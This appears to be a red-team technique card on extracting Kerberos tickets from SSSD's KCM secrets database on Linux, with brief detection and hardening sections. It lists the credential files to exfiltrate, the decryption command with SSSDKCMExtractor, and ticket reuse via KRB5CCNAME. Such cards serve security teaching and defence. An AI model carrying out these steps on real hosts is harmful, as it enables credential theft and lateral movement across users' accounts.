# [CA-KERB-016]: SSSD KCM CCACHE Extraction

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-KERB-016 |
| **MITRE ATT&CK v18.1** | [Steal or Forge Kerberos Tickets (T1558)](https://attack.mitre.org/techniques/T1558/) |
| **Tactic** | Credential Access |
| **Platforms** | Linux / Unix |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** The System Security Services Daemon (SSSD) stores Kerberos credentials in a local database (`secrets.ldb`) protected by a master key (`.secrets.mkey`). An attacker with root access can decrypt this database to retrieve TGTs and Service Tickets for all users who have logged into the system.
- **Attack Surface:** `/var/lib/sss/secrets/secrets.ldb`.
- **Business Impact:** **Lateral Movement**. Harvesting valid tickets for multiple users from a single compromised Linux server.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** Root.
- **Vulnerable Config:** SSSD using KCM (Kerberos Cache Manager) storage.
- **Tools:**
    - [SSSDKCMExtractor](https://github.com/fireeye/SSSDKCMExtractor)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Exfiltration**
Exfiltrate the database and key.
- `/var/lib/sss/secrets/secrets.ldb`
- `/var/lib/sss/secrets/.secrets.mkey`

**Step 2: Decryption (Offline)**
```bash
python3 SSSDKCMExtractor.py --database secrets.ldb --key secrets.mkey
```
*Output: Multiple `.ccache` files.*

**Step 3: Reuse**
```bash
export KRB5CCNAME=extracted_ticket.ccache
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Auditd
| Source | Event ID | Filter Logic |
|---|---|---|
| **Auditd** | `open`/`access` | Access to `/var/lib/sss/secrets/` by non-sssd processes. |

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Access Control:** Strictly limit root access.
*   **File Integrity Monitoring (FIM):** Monitor access to the `.mkey` file.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-EXPLOIT-004]
> **Next Logical Step:** [LAT-SMB-001]
